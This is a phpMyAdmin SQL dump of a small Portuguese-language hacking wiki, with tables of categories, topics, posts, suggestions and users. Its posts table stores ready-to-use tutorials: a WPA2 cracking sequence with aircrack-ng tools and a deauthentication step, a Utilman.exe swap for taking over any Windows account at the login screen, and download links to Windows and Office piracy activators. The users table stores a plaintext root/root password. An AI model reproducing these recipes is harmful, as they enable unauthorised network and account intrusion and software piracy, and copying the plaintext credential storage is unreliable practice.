-- phpMyAdmin SQL Dump
-- version 4.5.1
-- http://www.phpmyadmin.net
--
-- Host: 127.0.0.1
-- Generation Time: 16-Nov-2016 às 04:28
-- Versão do servidor: 10.1.16-MariaDB
-- PHP Version: 5.6.24

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `wiki`
--

-- --------------------------------------------------------

--
-- Estrutura da tabela `categorias`
--

CREATE TABLE `categorias` (
  `idC` int(11) NOT NULL,
  `nomeC` varchar(150) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Extraindo dados da tabela `categorias`
--

INSERT INTO `categorias` (`idC`, `nomeC`) VALUES
(1, 'Tutorial'),
(2, 'Downloads'),
(3, 'Artigos, Livros e eBooks'),
(4, 'Vídeos');

-- --------------------------------------------------------

--
-- Estrutura da tabela `linguagens`
--

CREATE TABLE `linguagens` (
  `idL` int(11) NOT NULL,
  `nomeL` varchar(150) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Extraindo dados da tabela `linguagens`
--

INSERT INTO `linguagens` (`idL`, `nomeL`) VALUES
(1, 'Java'),
(2, 'HTML'),
(3, 'CSS'),
(4, 'PHP'),
(5, 'SQL'),
(6, 'Visual Studio'),
(7, 'Python'),
(8, 'Kali Linux'),
(9, 'Google Hacking'),
(10, 'Engenharia Social'),
(11, 'Windows'),
(12, 'Linux'),
(13, 'iOS'),
(14, 'Android'),
(15, 'GitHub'),
(16, 'Virtualização');

-- --------------------------------------------------------

--
-- Estrutura da tabela `postagens`
--

CREATE TABLE `postagens` (
  `id` int(11) NOT NULL,
  `titulo` text CHARACTER SET latin1,
  `conteudo` text CHARACTER SET latin1,
  `formato` varchar(200) CHARACTER SET latin1 DEFAULT NULL,
  `linguagem` int(11) DEFAULT NULL,
  `categoria` int(11) DEFAULT NULL,
  `autor` varchar(100) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Extraindo dados da tabela `postagens`
--

INSERT INTO `postagens` (`id`, `titulo`, `conteudo`, `formato`, `linguagem`, `categoria`, `autor`) VALUES
(1, 'Quebrando WPA2', '<b>Criar Wordlist:</b><br><br>\n$ crunch 8 63 -f charset.lst mixalpha-numeric-all-space -o wordlist.txt<br>\n<br>\n<b>WPA2:</b><br>\n$ airmon-ng start wlan0<br>\n$ airodump-ng wlan0<br>\n$ airodump-ng -w captura-WPA2 --bssid 00:00:00:00:00:00 -c 6 wlan0<br>\n<br>\n<i>Em caso de <b>fixed channel mon0: -1</b>: $ airodump-ng -w captura-WPA2 --bssid 00:00:00:00:00:00 -c 6 wlan0 --ignore-negative-one</i><br>\n<br>\n$ aireplay-ng --deauth 0 -a 00:23:CD:F7:F1:56 -c F0:5A:09:D7:0A:F6 mon0<br>\n<br>\n$ aircrack-ng -w ''wordlist.txt'' ''captura-WPA2''<br>\n$ airmon-ng stop wlan0<br>', 'css/filetype/html.svg', 8, 1, NULL),
(2, 'Como logar em qualquer usuário Windows', '<b>1) Insira o Tails Linux no drive e inicie o sistema.</b><br> <br> <b>2) Acesse o Terminal e digite:</b> $ cd /media/PARTIÇÃO_DO_WINDOWS/Windows/System32<br> $ mv Utilman.exe Utilman.old<br> $ cp cmd.exe Utilman.exe<br> <br> <b>3) Reinicie o computador e remova o Tails Linux.</b><br> <br> <b>4) Na página de login, clique no ícone de Facilidade de Acesso para abrir o CMD.</b><br> <br> <b>5) Digite os comandos:</b><br> $ explorer.exe<br> $ net user NOME_DO_USUARIO *<br> <br> <b>6) Após o último comando, será possível alterar a senha do usuário.</b>', 'css/filetype/html.svg', 11, 1, NULL),
(3, 'Curso de Metasploit Framework', '../extras/Curso de Metasploit Framework.pdf', 'css/filetype/pdf.svg', 8, 3, NULL),
(4, 'Comandos para MS-DOS', '../extras/Comandos para MS-DOS.pdf', 'css/filetype/pdf.svg', 11, 3, NULL),
(5, 'Comandos Executar', '../extras/Comandos Executar.pdf', 'css/filetype/pdf.svg', 11, 3, NULL),
(6, 'Coleta de Informação com o TheHarvester', 'https://www.youtube.com/watch?v=tDASWzcB0yM', 'css/filetype/youtube.svg', 8, 4, NULL),
(7, 'Windows Loader', 'Ativador para Windows 7.<br><br><b>Link para Download:</b><br>https://drive.google.com/open?id=0B8VQ-vSPpE6LX1BReEU3bkt4dHM', 'css/filetype/zip.svg', 11, 2, NULL),
(8, 'KMSpico 10.0.4', 'Ativador para Windows 8, 8.1 e 10 + Pacotes Office 2013 e 2016.<br><br><b>Obs.:</b><i>Para utilizar o ativador, é necessário ter instalado o Microsoft .NET Framework 4.0 ou superior.</i><br><br><b>Link para Download: </b><br>https://drive.google.com/open?id=0B8VQ-vSPpE6LNFJ2cjYyd0d0ZVk', 'css/filetype/zip.svg', 11, 2, NULL),
(9, 'Como tirar o erro Instalação mal sucedida do Microsoft .NET Framework 4', 'https://www.youtube.com/watch?v=zqXIbW8Au5w', 'css/filetype/youtube.svg', 11, 4, NULL);

-- --------------------------------------------------------

--
-- Estrutura da tabela `sugestoes`
--

CREATE TABLE `sugestoes` (
  `id` int(11) NOT NULL,
  `titulo` text CHARACTER SET latin1,
  `descricao` text CHARACTER SET latin1,
  `categoria` varchar(200) CHARACTER SET latin1 DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Extraindo dados da tabela `sugestoes`
--

INSERT INTO `sugestoes` (`id`, `titulo`, `descricao`, `categoria`) VALUES
(1, 'Tutorial VirtualBox', 'Tutorial de instalação do VirtualBox e configuração de uma máquina virtual.', 'VirtualBox'),
(2, 'NMAP', 'Fazer página com todos os comandos possíveis de se realizar no NMAP com explicação e exemplos.', 'Kali Linux'),
(3, 'Lista de Diretórios ', 'Fazer página com listagem dos diretórios padrões do Linux e quais suas respectivas funcionalidades.', 'Linux'),
(4, 'Tutorial VirtualBox', 'Tutorial de instalação do VirtualBox e configuração de uma máquina virtual', 'VirtualBox');

-- --------------------------------------------------------

--
-- Estrutura da tabela `usuarios`
--

CREATE TABLE `usuarios` (
  `id` int(11) NOT NULL,
  `nome` varchar(200) CHARACTER SET latin1 DEFAULT NULL,
  `usuario` varchar(200) CHARACTER SET latin1 DEFAULT NULL,
  `senha` text CHARACTER SET latin1
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Extraindo dados da tabela `usuarios`
--

INSERT INTO `usuarios` (`id`, `nome`, `usuario`, `senha`) VALUES
(1, 'Master', 'root', 'root');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `categorias`
--
ALTER TABLE `categorias`
  ADD PRIMARY KEY (`idC`);

--
-- Indexes for table `linguagens`
--
ALTER TABLE `linguagens`
  ADD PRIMARY KEY (`idL`);

--
-- Indexes for table `postagens`
--
ALTER TABLE `postagens`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `sugestoes`
--
ALTER TABLE `sugestoes`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `usuarios`
--
ALTER TABLE `usuarios`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `categorias`
--
ALTER TABLE `categorias`
  MODIFY `idC` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;
--
-- AUTO_INCREMENT for table `linguagens`
--
ALTER TABLE `linguagens`
  MODIFY `idL` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=17;
--
-- AUTO_INCREMENT for table `postagens`
--
ALTER TABLE `postagens`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;
--
-- AUTO_INCREMENT for table `sugestoes`
--
ALTER TABLE `sugestoes`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;
--
-- AUTO_INCREMENT for table `usuarios`
--
ALTER TABLE `usuarios`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
